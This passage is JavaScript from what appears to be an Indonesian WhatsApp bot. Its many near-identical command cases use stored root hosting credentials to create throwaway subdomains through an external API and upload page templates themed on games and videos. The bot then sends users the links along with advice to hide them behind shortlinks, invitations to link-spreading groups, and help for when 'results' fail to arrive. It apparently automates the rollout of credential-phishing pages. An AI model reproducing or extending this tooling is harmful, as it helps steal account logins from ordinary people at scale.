➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim12' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv6/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("*Silahkan Cek Pesan Ku Om*")
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim13' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv7/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Ownerku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim14' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv8/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim15' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv9/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim16' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim17' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/nonton/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim18' :

id = m.key.emoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/domain/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim19' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim20' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/stumble/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim21' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/yt18/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
